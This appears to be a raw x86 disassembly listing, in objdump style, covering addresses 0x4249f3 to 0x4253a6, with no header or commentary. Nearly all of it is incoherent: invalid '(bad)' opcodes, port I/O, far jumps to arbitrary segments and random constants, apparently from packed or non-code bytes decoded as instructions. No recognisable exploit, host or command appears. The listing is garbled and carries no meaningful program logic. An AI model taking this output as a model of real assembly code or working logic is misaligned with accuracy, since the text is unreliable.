  4249f3:	xor    BYTE PTR fs:[edx+eiz*8],dh
  4249f7:	je     0x424a66
  4249f9:	ins    BYTE PTR es:[edi],dx
  4249fa:	dec    edx
  4249fb:	inc    DWORD PTR [ebp-0xe]
  4249fe:	popa   
  4249ff:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  424a01:	sbb    BYTE PTR [eax-0x51],dl
  424a04:	sbb    BYTE PTR [ebp-0x10],dh
  424a07:	andps  xmm4,XMMWORD PTR [edi]
  424a0a:	adc    al,0x8b
  424a0c:	fsub   QWORD PTR [eax+0x37]
  424a0f:	jb     0x4249cd
  424a11:	fnstenv [esp+edx*4]
  424a14:	daa    
  424a15:	inc    ebp
  424a16:	inc    ebp
  424a17:	xchg   DWORD PTR [edx],edx
  424a19:	jg     0x424a21
  424a1b:	or     BYTE PTR ds:0x55b86fb7,bl
  424a21:	mov    ds:0x88b7aa96,eax
  424a26:	rcr    BYTE PTR [ebx],0x8c
  424a29:	fmulp  st(5),st
  424a2b:	test   DWORD PTR [ecx-0x2b5e5f5],edx
  424a31:	stos   DWORD PTR es:[edi],eax
  424a32:	sub    DWORD PTR [edi-0x6cec0cd],0x77
  424a39:	fcomp  QWORD PTR [esi+0x33]
  424a3c:	test   al,0xe8
  424a3e:	gs mov eax,0xfa20e5c1
  424a44:	xchg   esi,eax
  424a45:	repnz adc eax,0xbee91929
  424a4b:	sbb    DWORD PTR [esi+0x1c],ebp
  424a4e:	mov    bh,0xd5
  424a50:	mov    dh,0x5
  424a52:	out    0x8b,eax
  424a54:	adc    al,0xca
  424a56:	in     al,dx
  424a57:	mov    ah,0x35
  424a59:	cwde   
  424a5a:	pop    ebx
  424a5b:	dec    ebx
  424a5c:	stc    
  424a5d:	adc    bh,cl
  424a5f:	lds    eax,FWORD PTR [edi-0x21]
  424a62:	xor    DWORD PTR [edx],esp
  424a64:	xor    DWORD PTR [ecx+0x61],edi
  424a67:	mov    esi,DWORD PTR [edx]
  424a69:	xor    ch,BYTE PTR [ebp+0x617349ad]
  424a6f:	(bad)  
  424a70:	test   BYTE PTR [edx],0xb6
  424a73:	xlat   BYTE PTR ds:[ebx]
  424a74:	mov    al,ds:0xdc0bf9ca
  424a79:	xchg   esp,eax
  424a7a:	imul   ebx,DWORD PTR [edx-0x65328d7],0x38
  424a81:	mov    ch,BYTE PTR ds:0x896345a8
  424a87:	aaa    
  424a88:	xchg   ebp,eax
  424a89:	xchg   edi,eax
  424a8a:	mov    dl,0xa4
  424a8c:	cli    
  424a8d:	dec    ebp
  424a8e:	push   ebx
  424a8f:	cmc    
  424a90:	repz fsub DWORD PTR [edi+0x0]
  424a94:	fidivr DWORD PTR [edi+0x7b857f30]
  424a9a:	xor    eax,0x820f3c1f
  424a9f:	push   ds
  424aa0:	loop   0x424b18
  424aa2:	xor    BYTE PTR [ebp+0x6e],0x58
  424aa6:	push   edi
  424aa7:	jbe    0x424abb
  424aa9:	retf   
  424aaa:	not    BYTE PTR [edi+0x24cefb30]
  424ab0:	push   ecx
  424ab1:	or     al,0x62
  424ab3:	jge    0x424a81
	...
  424b15:	add    BYTE PTR [esi],al
  424b17:	aas    
  424b18:	or     eax,0xb6bb3db9
  424b1d:	mov    edi,0x1cbed53b
  424b22:	fiadd  WORD PTR [edx+ecx*8+0x186d2c6]
  424b29:	add    BYTE PTR [edi],al
  424b2b:	add    DWORD PTR [eax],eax
  424b2d:	add    al,ch
  424b2f:	xchg   esi,eax
  424b30:	adc    eax,DWORD PTR [ebx+0x66]
  424b33:	mov    BYTE PTR [ecx+0xf],0x38
  424b37:	sar    dl,1
  424b39:	scas   eax,DWORD PTR es:[edi]
  424b3a:	sub    eax,0x38a27b34
  424b3f:	pop    ebp
  424b40:	add    eax,0xf441c99d
  424b45:	cdq    
  424b46:	js     0x424b58
  424b48:	fisub  DWORD PTR [esi]
  424b4a:	jbe    0x424b0a
  424b4c:	mov    ch,0xdf
  424b4e:	push   edi
  424b4f:	xor    al,0x24
  424b51:	fnstsw WORD PTR [ebp+0x336fb85]
  424b57:	or     al,0xbb
  424b59:	xor    al,0x66
  424b5b:	and    esp,esi
  424b5d:	fcmovu st,st(7)
  424b5f:	add    bh,ch
  424b61:	ror    BYTE PTR [edx],1
  424b63:	popf   
  424b64:	imul   edx,esi,0x26
  424b67:	inc    ebp
  424b68:	mov    ecx,0x3588109f
  424b6d:	in     eax,0x4e
  424b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b70:	lods   eax,DWORD PTR ds:[esi]
  424b71:	add    DWORD PTR [edx+ecx*1-0xf],ebp
  424b75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b76:	xchg   edi,eax
  424b77:	and    bh,BYTE PTR ds:[edx-0x74]
  424b7b:	mov    edx,0xd9e03efb
  424b80:	jge    0x424b6a
  424b82:	cmp    esp,DWORD PTR [edi+0x66]
  424b85:	(bad)  
  424b87:	add    BYTE PTR [ebx-0x7d],al
  424b8a:	sbb    cl,BYTE PTR [ecx-0x1a]
  424b8d:	mov    ah,0x7b
  424b8f:	stos   DWORD PTR es:[edi],eax
  424b90:	not    DWORD PTR [edi-0x6f0f4a9]
  424b96:	cli    
  424b97:	jl     0x424b41
  424b99:	ins    DWORD PTR es:[edi],dx
  424b9a:	mov    esi,0x1ae09a4b
  424b9f:	sub    eax,0xcffea024
  424ba4:	mov    bh,0x2b
  424ba6:	xchg   esi,eax
  424ba7:	pop    edx
  424ba8:	push   ds
  424ba9:	stos   DWORD PTR es:[edi],eax
  424baa:	and    ecx,eax
  424bac:	push   edx
  424bad:	or     eax,0x9d59a52d
  424bb2:	cmp    BYTE PTR [ecx-0x48],0x2d
  424bb6:	test   cl,bh
  424bb8:	xchg   edx,eax
  424bb9:	stc    
  424bba:	leave  
  424bbb:	and    ecx,DWORD PTR ds:0x12df3c0e
  424bc1:	das    
  424bc2:	(bad)  
  424bc3:	add    edi,ebx
  424bc5:	fiadd  DWORD PTR [edi-0x2e]
  424bc8:	(bad)  
  424bc9:	fiadd  DWORD PTR [ebp+edx*4+0x64]
  424bcd:	xchg   ecx,eax
  424bce:	inc    ebx
  424bcf:	outs   dx,DWORD PTR ds:[esi]
  424bd0:	shl    BYTE PTR [esi+0x24d8c785],1
  424bd6:	hlt    
  424bd7:	out    0x71,al
  424bd9:	adc    dl,al
  424bdb:	pushf  
  424bdc:	rol    DWORD PTR [edi+0x28],1
  424bdf:	xchg   ebx,eax
  424be0:	xor    dh,BYTE PTR ds:0x573960de
  424be6:	imul   ecx,DWORD PTR [esi+0x7c13dafa],0xffffffe6
  424bed:	in     al,0x55
  424bef:	or     DWORD PTR [edx+0x496f6622],eax
  424bf5:	and    BYTE PTR [ebx],0x1
  424bf8:	jmp    0x424c26
  424bfa:	xchg   edi,eax
  424bfb:	outs   dx,BYTE PTR ds:[esi]
  424bfc:	jae    0x424bde
  424bfe:	test   eax,0x3e460c6a
  424c03:	adc    esp,edx
  424c05:	xchg   ebp,eax
  424c06:	test   DWORD PTR [edx-0x76],ecx
  424c09:	fs cld 
  424c0b:	push   es
  424c0c:	cmp    eax,DWORD PTR [esi+0x27]
  424c0f:	out    0x1d,al
  424c11:	(bad)  
  424c13:	jecxz  0x424c6c
  424c15:	out    0xb1,al
  424c17:	push   ebp
  424c18:	hlt    
  424c19:	or     al,0x62
  424c1b:	dec    eax
  424c1c:	outs   dx,BYTE PTR ds:[esi]
  424c1d:	push   cs
  424c1e:	sbb    BYTE PTR [eax+0x7b76943d],dl
  424c24:	jg     0x424c4b
  424c26:	jno    0x424c4e
  424c28:	or     eax,DWORD PTR [edi]
  424c2a:	scas   eax,DWORD PTR es:[edi]
  424c2b:	mov    bh,0xdd
  424c2d:	stos   DWORD PTR es:[edi],eax
  424c2e:	sbb    esp,DWORD PTR [edx+0x36]
  424c31:	int    0x3b
  424c33:	lods   al,BYTE PTR ds:[esi]
  424c34:	aad    0x0
	...
  424c96:	ins    BYTE PTR es:[edi],dx
  424c97:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424c9e:	sub    eax,0x4588c09
  424ca3:	inc    edi
  424ca4:	adc    ecx,DWORD PTR [edi]
  424ca6:	fld    DWORD PTR [edi+0x1070001]
  424cac:	add    BYTE PTR [eax],al
  424cae:	or     dh,BYTE PTR [ecx+ecx*1+0x6d]
  424cb2:	not    BYTE PTR [edi]
  424cb4:	leave  
  424cb5:	xchg   ebx,edi
  424cb7:	sbb    edx,esp
  424cb9:	(bad)  
  424cba:	out    dx,al
  424cbb:	mov    bh,bh
  424cbd:	imul   esi,ecx,0x99c727d7
  424cc3:	add    dh,bl
  424cc5:	sbb    eax,0xb2c059c0
  424cca:	jecxz  0x424c64
  424ccc:	test   al,0x0
  424cce:	iret   
  424ccf:	icebp  
  424cd0:	leave  
  424cd1:	mov    ?,edx
  424cd3:	xchg   esi,eax
  424cd4:	cli    
  424cd5:	xor    eax,0x512b9ece
  424cda:	loope  0x424d2b
  424cdc:	add    al,0x71
  424cde:	sbb    esi,DWORD PTR [ebx-0x5c]
  424ce1:	mov    ch,BYTE PTR [ebx+0x25]
  424ce4:	in     al,0x8
  424ce6:	(bad)  
  424ce7:	cdq    
  424ce8:	add    eax,0x5bd8b871
  424ced:	jnp    0x424d0f
  424cef:	bound  ecx,QWORD PTR [eax+edi*2]
  424cf2:	cmc    
  424cf3:	dec    esp
  424cf4:	cmp    eax,0x1007a2c
  424cf9:	test   DWORD PTR [ecx],ecx
  424cfb:	mov    eax,0xdf19f46b
  424d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d01:	pop    esp
  424d02:	push   0x585fe1fd
  424d07:	pusha  
  424d08:	and    eax,0x3a40e75d
  424d0d:	int    0x77
  424d0f:	lods   al,BYTE PTR ds:[esi]
  424d10:	(bad)  
  424d11:	pushf  
  424d12:	jae    0x424cd9
  424d14:	inc    eax
  424d15:	(bad)  
  424d17:	scas   al,BYTE PTR es:[edi]
  424d18:	fincstp 
  424d1a:	das    
  424d1b:	xchg   ebx,eax
  424d1c:	test   edi,ebx
  424d1e:	inc    ecx
  424d1f:	jbe    0x424d92
  424d21:	sub    ecx,DWORD PTR [ecx-0x3379324c]
  424d27:	dec    edx
  424d28:	ja     0x424cee
  424d2a:	fcmove st,st(7)
  424d2c:	test   BYTE PTR [ebx+0x5edf5e8e],0x40
  424d33:	test   DWORD PTR [ebx],0x29889a3a
  424d39:	test   BYTE PTR [eax+0x2c7f85ed],0x3
  424d40:	jmp    0x592af488
  424d45:	mov    cl,0xd7
  424d48:	sub    BYTE PTR [edi+ebx*4+0x50],ah
  424d4c:	fs push 0x4f
  424d4f:	fisub  DWORD PTR [edx-0x62bbaf26]
  424d55:	lods   eax,DWORD PTR ds:[esi]
  424d56:	and    cl,BYTE PTR [edx+0x3142e621]
  424d5c:	add    ah,BYTE PTR [edx+0x593c47d2]
  424d62:	mov    ecx,0x25fe22d
  424d67:	arpl   WORD PTR [esi],cx
  424d69:	adc    esi,ebp
  424d6b:	push   ebx
  424d6c:	xor    eax,0x73d8347
  424d71:	mov    dl,al
  424d73:	pop    ss
  424d74:	sbb    eax,0x751b9dbf
  424d79:	scas   al,BYTE PTR es:[edi]
  424d7a:	xchg   esi,eax
  424d7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d7c:	sbb    al,0x53
  424d7e:	sbb    eax,0x34d5ee42
  424d83:	mov    esp,0x4e87883a
  424d88:	xchg   ecx,eax
  424d89:	(bad)
  424d8d:	jmp    0xb88e:0x1528afc4
  424d94:	xchg   edi,eax
  424d95:	loop   0x424d4f
  424d97:	fsubr  DWORD PTR [esi+0x61ec8d3c]
  424d9d:	inc    esi
  424d9e:	loope  0x424d7a
  424da0:	in     al,0xdc
  424da2:	jb     0x424d92
  424da4:	(bad)  
  424da6:	ss mov bh,0x6f
  424da9:	test   BYTE PTR [ecx+0x72],bl
  424dac:	(bad)  
  424dad:	in     eax,dx
  424dae:	call   0xa954:0xe3b163f3
	...
  424e15:	add    BYTE PTR ds:0xf361d20c,bh
  424e1b:	(bad)  
  424e1c:	mov    edi,0xb8b3635c
  424e21:	xchg   DWORD PTR [edx+ebx*4+0x23],esp
  424e25:	push   edx
  424e26:	loopne 0x424db0
  424e28:	add    DWORD PTR [eax],eax
  424e2a:	pop    es
  424e2b:	add    DWORD PTR [eax],eax
  424e2d:	add    BYTE PTR [esi-0x3eb30252],dh
  424e33:	mov    dl,0xab
  424e35:	and    eax,0xa1cd6c00
  424e3a:	es cwde 
  424e3c:	pop    ebx
  424e3d:	dec    ebx
  424e3e:	or     DWORD PTR [ebx-0x9],ebx
  424e41:	inc    esp
  424e42:	and    al,0x2a
  424e44:	sub    DWORD PTR [ebx+0x63],esi
  424e47:	ds xchg eax,eax
  424e4a:	jns    0x424ddc
  424e4c:	addr16 call edi
  424e4f:	jno    0x424eb2
  424e51:	into   
  424e52:	pop    ecx
  424e53:	jl     0x424e00
  424e55:	shl    eax,0x2f
  424e58:	inc    ecx
  424e59:	call   0xe39abd6f
  424e5e:	fwait
  424e5f:	jmp    0xf605:0x8f58bdbd
  424e66:	fs aaa 
  424e68:	dec    esi
  424e69:	imul   bh
  424e6b:	fucomp st(2)
  424e6d:	mov    al,ds:0xf168a29c
  424e72:	imul   DWORD PTR [edx-0x34e68011]
  424e78:	xor    DWORD PTR [edx],eax
  424e7a:	test   ch,bl
  424e7c:	inc    edi
  424e7d:	jae    0x424ec2
  424e7f:	push   ebx
  424e80:	cmp    DWORD PTR [esi-0x30],ecx
  424e83:	out    0x9b,al
  424e85:	jb     0x424eda
  424e87:	jo     0x424e83
  424e89:	inc    ebp
  424e8a:	jg     0x424f07
  424e8c:	mov    gs,WORD PTR [edi+edx*4]
  424e8f:	out    dx,al
  424e90:	or     esi,DWORD PTR [ecx]
  424e92:	xchg   edx,eax
  424e93:	mov    WORD PTR [ecx],es
  424e95:	cmp    BYTE PTR [ebx],0x9e
  424e98:	and    al,0x96
  424e9a:	sbb    ch,BYTE PTR [edx-0x6fde4d4d]
  424ea0:	and    al,bh
  424ea2:	mov    bl,0x96
  424ea4:	das    
  424ea5:	push   es
  424ea6:	sbb    DWORD PTR [ecx+0x8],ebp
  424ea9:	ins    BYTE PTR es:[edi],dx
  424eaa:	dec    esp
  424eab:	xor    eax,0x46f39e07
  424eb0:	leave  
  424eb1:	arpl   dx,sp
  424eb3:	or     al,0x7b
  424eb5:	mov    ebx,0x3a9e7bf8
  424eba:	ds leave 
  424ebc:	cmp    DWORD PTR [eax+0x1b],esi
  424ebf:	scas   eax,DWORD PTR es:[edi]
  424ec0:	ret    
  424ec1:	pop    ss
  424ec2:	fst    st(1)
  424ec4:	pop    es
  424ec5:	push   DWORD PTR [ecx+0x45]
  424ec8:	xchg   DWORD PTR [edi+0x665e5fd8],ebp
  424ece:	ja     0x424f29
  424ed0:	sbb    eax,0x7afa6044
  424ed5:	ret    
  424ed6:	ja     0x424f51
  424ed8:	test   al,bl
  424eda:	mov    es,WORD PTR [edi-0x77aba1bf]
  424ee0:	(bad)  
  424ee2:	scas   eax,DWORD PTR es:[edi]
  424ee3:	(bad)  
  424ee4:	int3   
  424ee5:	pop    esi
  424ee6:	cmc    
  424ee7:	ss mov edi,0x6b3c08f
  424eed:	fbstp  TBYTE PTR [ecx+0x7d]
  424ef0:	mov    ah,0xe3
  424ef2:	out    0x8,eax
  424ef4:	jnp    0x424f2a
  424ef6:	mov    cl,0xbb
  424ef8:	or     edx,edi
  424efa:	ret    0x5713
  424efd:	or     DWORD PTR [eax-0x75],0xffffffd6
  424f01:	sahf   
  424f02:	or     eax,0xdad9486f
  424f07:	loope  0x424f5f
  424f09:	jg     0x424ed7
  424f0b:	and    DWORD PTR [esi+esi*1+0xe],edi
  424f0f:	dec    eax
  424f10:	ret    0xe820
  424f13:	inc    ebp
  424f14:	outs   dx,DWORD PTR ds:[esi]
  424f15:	adc    eax,0xc89bd44d
  424f1a:	aas    
  424f1b:	mov    dl,0x9
  424f1d:	test   eax,0xd7d65655
  424f22:	jo     0x424f9c
  424f24:	push   0x55
  424f26:	cld    
  424f27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f28:	loop   0x424f04
  424f2a:	mov    dh,0x9f
  424f2c:	or     BYTE PTR [ecx+0x32],0x14
  424f30:	cld    
  424f31:	ds popa 
  424f33:	dec    ebx
  424f34:	xchg   BYTE PTR [eax],al
	...
  424f96:	dec    ebx
  424f97:	push   ss
  424f98:	int    0x41
  424f9a:	fstp   st(3)
  424f9c:	iret   
  424f9d:	push   ds
  424f9e:	xor    al,0x88
  424fa0:	ror    BYTE PTR [eax+0x30e93141],1
  424fa6:	out    0x89,eax
  424fa8:	add    DWORD PTR [eax],eax
  424faa:	pop    es
  424fab:	add    DWORD PTR [eax],eax
  424fad:	add    BYTE PTR [esi-0x7076eff],dh
  424fb3:	pushf  
  424fb4:	fistp  DWORD PTR ds:0x610d8ad0
  424fba:	jns    0x424fec
  424fbc:	out    dx,al
  424fbd:	stos   BYTE PTR es:[edi],al
  424fbe:	cld    
  424fbf:	popf   
  424fc0:	mov    ch,0xce
  424fc2:	in     eax,0x1d
  424fc4:	inc    edi
  424fc5:	pop    ss
  424fc6:	pop    ebx
  424fc7:	xchg   al,bl
  424fc9:	or     BYTE PTR [si+0x56],bl
  424fcd:	das    
  424fce:	(bad)  
  424fcf:	jp     0x424fff
  424fd1:	mov    eax,ds:0x84555af
  424fd6:	loope  0x425041
  424fd8:	push   es
  424fd9:	aas    
  424fda:	data16 (bad) 
  424fdc:	nop
  424fdd:	test   al,0x6e
  424fdf:	pop    ebp
  424fe0:	pop    edx
  424fe1:	fdivr  QWORD PTR [edi-0x47]
  424fe4:	aad    0xe6
  424fe6:	idiv   DWORD PTR [eax+0x12]
  424fe9:	daa    
  424fea:	sbb    ebp,DWORD PTR [esi]
  424fec:	lea    ebx,[ebx-0x3d]
  424fef:	add    BYTE PTR [edi+0x1f],cl
  424ff2:	ret    
  424ff3:	push   es
  424ff4:	cmp    cl,bh
  424ff6:	mov    ebx,0x83660b9f
  424ffb:	mov    bl,0xfd
  424ffd:	cmc    
  424ffe:	adc    eax,0xd6ee99d9
  425003:	enter  0xd4e3,0xb0
  425007:	mov    bh,0x3f
  425009:	aas    
  42500a:	cmp    DWORD PTR [ebp-0x6e],ebp
  42500d:	jnp    0x425004
  42500f:	jo     0x425030
  425011:	das    
  425012:	in     eax,dx
  425013:	jbe    0x425017
  425015:	stos   BYTE PTR es:[edi],al
  425016:	aam    0x5
  425018:	sahf   
  425019:	pop    ebp
  42501a:	lds    ebp,FWORD PTR [edx+eax*4]
  42501d:	cli    
  42501e:	xor    ch,cl
  425020:	mov    WORD PTR [ebp-0x5213fa54],es
  425026:	adc    DWORD PTR [esi],esp
  425028:	in     al,0xc6
  42502a:	aad    0xcf
  42502c:	imul   BYTE PTR [ecx-0x62]
  42502f:	ja     0x424fd3
  425031:	cmp    edx,DWORD PTR [ebx+eax*8]
  425034:	pop    ss
  425035:	(bad)  
  425036:	js     0x425068
  425038:	and    DWORD PTR [edi-0x53],edx
  42503b:	jns    0x42508f
  42503d:	mov    bl,0x63
  42503f:	fild   WORD PTR [ecx-0x1e]
  425042:	sbb    ch,BYTE PTR [edx]
  425044:	ja     0x4250b0
  425046:	xchg   BYTE PTR [ebx-0x2c],dl
  425049:	xchg   esp,eax
  42504a:	dec    esp
  42504b:	or     eax,0xeacefff8
  425050:	jp     0x424fef
  425052:	fidiv  DWORD PTR [eax+0x13]
  425055:	mov    edi,0x38fe0596
  42505a:	rcl    DWORD PTR [edx+0x1f],0x7d
  42505e:	and    eax,0x1e87d96a
  425063:	in     eax,dx
  425064:	dec    ebx
  425065:	and    eax,0xfcb2fe67
  42506a:	dec    eax
  42506b:	push   esi
  42506c:	xchg   DWORD PTR [eax+eax*4+0x2ced0599],ebp
  425073:	pusha  
  425074:	push   0x34
  425076:	cdq    
  425077:	outs   dx,DWORD PTR es:[esi]
  425079:	mov    ds:0x82631682,eax
  42507e:	push   esi
  42507f:	sub    eax,0x41303bda
  425084:	call   0x996:0x9afe951b
  42508b:	sub    ebp,edi
  42508d:	(bad)  
  42508e:	jo     0x425036
  425090:	mov    bl,0x22
  425092:	(bad)  
  425093:	in     eax,0xe1
  425095:	xor    al,0xb0
  425097:	bound  esi,QWORD PTR [ebx-0x7b]
  42509a:	pusha  
  42509b:	mov    eax,ds:0x1f63a901
  4250a0:	leave  
  4250a1:	or     eax,0x3169c07b
  4250a6:	and    al,0x7b
  4250a8:	xchg   ebx,eax
  4250a9:	xor    DWORD PTR [eax+ecx*2-0x53],0xee92bafc
  4250b1:	pop    edx
  4250b2:	(bad)  
  4250b3:	pushf  
  4250b4:	stc    
	...
  425115:	add    dh,bl
  425117:	adc    DWORD PTR [edi-0x15020dd],ebx
  42511d:	std    
  42511e:	and    al,0x47
  425120:	xchg   edi,eax
  425121:	sar    BYTE PTR [ebx+0x57],cl
  425124:	sar    DWORD PTR [eax],1
  425126:	out    dx,al
  425127:	mov    al,BYTE PTR [ecx]
  425129:	add    BYTE PTR [edi],al
  42512b:	add    DWORD PTR [eax],eax
  42512d:	add    BYTE PTR [ebx+0x5e12634b],dh
  425133:	pop    ss
  425134:	loop   0x425134
  425136:	xor    eax,0x9feb03ad
  42513b:	sub    al,0xaa
  42513d:	and    eax,0xb7a162c4
  425142:	test   eax,0x36598bd3
  425147:	sti    
  425148:	dec    eax
  425149:	pop    ds
  42514a:	(bad)  [edx-0x3e1cf52a]
  425150:	fdivr  DWORD PTR [esi+ebp*4]
  425153:	cli    
  425154:	xor    eax,0x2a4fb8cd
  425159:	pusha  
  42515a:	shl    DWORD PTR [esi-0x391dbad7],cl
  425160:	dec    esp
  425161:	pop    ebp
  425162:	in     al,dx
  425163:	cmp    edi,DWORD PTR [esi+0xc]
  425166:	leave  
  425167:	hlt    
  425168:	cli    
  425169:	lods   eax,DWORD PTR ds:[esi]
  42516a:	and    ebx,DWORD PTR [ecx-0x7a8c0310]
  425170:	and    al,BYTE PTR [eax-0x3a52344b]
  425176:	mov    al,0x73
  425178:	jmp    0x42511b
  42517a:	and    ebp,0xb6b25a23
  425180:	push   ebx
  425181:	xchg   edi,eax
  425182:	mov    edx,0x71fb7055
  425187:	je     0x42519d
  425189:	fstp   st(1)
  42518b:	retf   
  42518c:	xchg   edx,eax
  42518d:	pop    ecx
  42518e:	or     al,0xb1
  425190:	dec    ecx
  425191:	arpl   bx,dx
  425193:	add    edi,DWORD PTR [ebx+ebx*1+0x1761c10c]
  42519a:	mov    ?,WORD PTR [esi-0x78381ebe]
  4251a0:	scas   al,BYTE PTR es:[edi]
  4251a1:	or     BYTE PTR [esi+0x6ec833a9],al
  4251a7:	lods   eax,DWORD PTR ds:[esi]
  4251a8:	mov    ch,0x8c
  4251aa:	mov    al,ds:0x3f8168ab
  4251af:	sbb    ch,dh
  4251b1:	ins    BYTE PTR es:[edi],dx
  4251b2:	xor    esp,DWORD PTR [eax+0x6622f0a1]
  4251b8:	mov    ch,0xfb
  4251ba:	retf   0x9b40
  4251bd:	mov    ds:0x3cb623b4,al
  4251c2:	push   ds
  4251c3:	aad    0xf2
  4251c5:	add    DWORD PTR [edi+eiz*1],esp
  4251c8:	jbe    0x42523d
  4251ca:	push   ebp
  4251cb:	sub    bl,BYTE PTR [eax+0x29]
  4251ce:	loopne 0x4251d1
  4251d0:	aas    
  4251d1:	aaa    
  4251d2:	and    dh,BYTE PTR [eax-0x7de53f6a]
  4251d8:	jmp    0x4251f6
  4251da:	adc    al,0x78
  4251dc:	inc    ebp
  4251dd:	push   ebx
  4251de:	push   ebp
  4251df:	leave  
  4251e0:	jmp    FWORD PTR [edi-0x4b]
  4251e3:	mov    esi,0x421c0dd2
  4251e8:	xor    esi,DWORD PTR [ecx-0x19b41f4c]
  4251ee:	nop
  4251ef:	pop    es
  4251f0:	aas    
  4251f1:	inc    edi
  4251f2:	out    dx,al
  4251f3:	js     0x42521e
  4251f5:	lahf   
  4251f6:	imul   edx,eax,0xffffff93
  4251f9:	out    dx,al
  4251fa:	pop    esi
  4251fb:	in     al,dx
  4251fc:	dec    ebp
  4251fd:	inc    esp
  4251fe:	cmp    ecx,DWORD PTR [ecx+0x58]
  425201:	push   ds
  425202:	out    dx,eax
  425203:	or     DWORD PTR [edi+0x2a],edi
  425206:	add    DWORD PTR [esi+eiz*1+0x17ae9120],0x1fffb981
  425211:	arpl   WORD PTR [esi],di
  425213:	inc    esp
  425214:	adc    cl,0x13
  425217:	xchg   edi,eax
  425218:	or     al,0x73
  42521a:	ins    BYTE PTR es:[edi],dx
  42521b:	mov    dl,0x4a
  42521d:	push   esp
  42521e:	sysret 
  425220:	stc    
  425221:	ds mov bh,BYTE PTR ds:[ebx+ebx*2+0x71a0c690]
  42522a:	adc    cl,BYTE PTR [ecx]
  42522c:	sub    al,0xd
  42522e:	sbb    dl,BYTE PTR [esi-0x1c719186]
  425234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  425295:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42529c:	mov    ebp,0x2e2083e6
  4252a1:	add    eax,0xf8f108ca
  4252a6:	cmc    
  4252a7:	mov    eax,DWORD PTR [ecx]
  4252a9:	add    BYTE PTR [edi],al
  4252ab:	add    DWORD PTR [eax],eax
  4252ad:	add    dh,dh
  4252af:	inc    DWORD PTR [edx]
  4252b1:	ja     0x425276
  4252b3:	or     al,0x20
  4252b5:	rcl    BYTE PTR [edx+0x47],1
  4252b8:	(bad)
  4252bc:	mov    ch,BYTE PTR [edi+0x30]
  4252bf:	push   ecx
  4252c0:	fsub   DWORD PTR [esi+0x1d]
  4252c3:	fwait
  4252c4:	inc    ebp
  4252c5:	ins    DWORD PTR es:[edi],dx
  4252c6:	pushf  
  4252c7:	and    BYTE PTR [edi],dl
  4252c9:	push   0x26
  4252cb:	scas   eax,DWORD PTR es:[edi]
  4252cc:	lahf   
  4252cd:	dec    ebx
  4252ce:	scas   eax,DWORD PTR es:[edi]
  4252cf:	fwait
  4252d0:	(bad)  
  4252d1:	outs   dx,DWORD PTR ds:[esi]
  4252d2:	add    DWORD PTR [edx-0x75b0402d],ebp
  4252d8:	sbb    BYTE PTR [esi],al
  4252da:	int3   
  4252db:	mov    dh,0x25
  4252dd:	push   ss
  4252de:	cdq    
  4252df:	push   es
  4252e0:	popa   
  4252e1:	xchg   esp,eax
  4252e2:	test   BYTE PTR [ebx],ah
  4252e4:	ret    
  4252e5:	sub    DWORD PTR [ebp+0x48370bd],esi
  4252eb:	xchg   esp,eax
  4252ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4252ed:	push   ds
  4252ee:	mov    al,ds:0x1403048d
  4252f3:	sbb    cl,BYTE PTR [ecx]
  4252f5:	add    eax,0xc1618ddf
  4252fa:	sbb    esp,ebp
  4252fc:	add    al,0x61
  4252fe:	or     BYTE PTR [ecx+0x6b1c3b17],ch
  425304:	ins    DWORD PTR es:[edi],dx
  425305:	repz scas al,BYTE PTR es:[edi]
  425307:	inc    edi
  425308:	cmp    BYTE PTR gs:[ebp-0x6a04fb22],dl
  42530f:	hlt    
  425310:	jge    0x425294
  425312:	or     eax,0xfc5eb826
  425317:	inc    edi
  425318:	push   0x74
  42531a:	push   ebp
  42531b:	dec    eax
  42531c:	outs   dx,BYTE PTR ds:[esi]
  42531d:	scas   eax,DWORD PTR es:[edi]
  42531e:	pop    es
  42531f:	jecxz  0x4252f0
  425321:	mov    cs,eax
  425323:	jo     0x425309
  425325:	pop    ds
  425326:	inc    eax
  425327:	push   ebp
  425328:	mov    esi,DWORD PTR [ecx]
  42532a:	stos   DWORD PTR es:[edi],eax
  42532b:	mov    eax,0x8747a837
  425330:	inc    ecx
  425331:	mov    bl,0xeb
  425333:	inc    ebp
  425334:	scas   eax,DWORD PTR es:[edi]
  425335:	jae    0x425330
  425337:	scas   eax,DWORD PTR es:[edi]
  425338:	xchg   ebp,eax
  425339:	xor    BYTE PTR [edi+0x250b72db],dh
  42533f:	(bad)  
  425340:	fsub   QWORD PTR [edx-0x2c]
  425343:	xchg   esp,eax
  425344:	aad    0x54
  425346:	scas   eax,DWORD PTR es:[edi]
  425347:	ins    BYTE PTR es:[edi],dx
  425348:	int    0x64
  42534a:	mov    WORD PTR [eax-0x66fa5d24],ss
  425350:	mov    cl,0xf9
  425352:	cmc    
  425353:	mov    ah,0x1b
  425355:	inc    edx
  425356:	jg     0x4252d8
  425358:	xor    al,0x3f
  42535a:	xor    esp,ecx
  42535c:	and    bh,BYTE PTR [edx+ebx*4-0x1e]
  425360:	inc    esi
  425361:	hlt    
  425362:	cld    
  425363:	aam    0x59
  425365:	enter  0x96dd,0x63
  425369:	pusha  
  42536a:	imul   eax,DWORD PTR [ebx-0xf],0xd011cf17
  425371:	adc    ch,ah
  425373:	cmp    DWORD PTR [ebx+0x4e],0xffffff88
  425377:	jo     0x4253aa
  425379:	sbb    DWORD PTR [ebp+0x7459d4a5],esp
  42537f:	ins    BYTE PTR es:[edi],dx
  425380:	es cld 
  425382:	out    dx,eax
  425383:	xchg   esp,eax
  425384:	mov    cl,0x9
  425386:	sub    bh,cl
  425388:	scas   al,BYTE PTR es:[edi]
  425389:	inc    eax
  42538a:	mov    esi,0x99e2603f
  42538f:	or     ebx,esp
  425391:	ds push edx
  425393:	fist   DWORD PTR [esi+0x4df24837]
  425399:	xchg   esp,eax
  42539a:	mov    bh,0x51
  42539c:	adc    BYTE PTR [esi+ebp*4+0x37],bl
  4253a0:	cs stos DWORD PTR es:[edi],eax
  4253a2:	pop    ds
  4253a3:	setae  BYTE PTR [esi]
  4253a6:	jns    0x4253ff
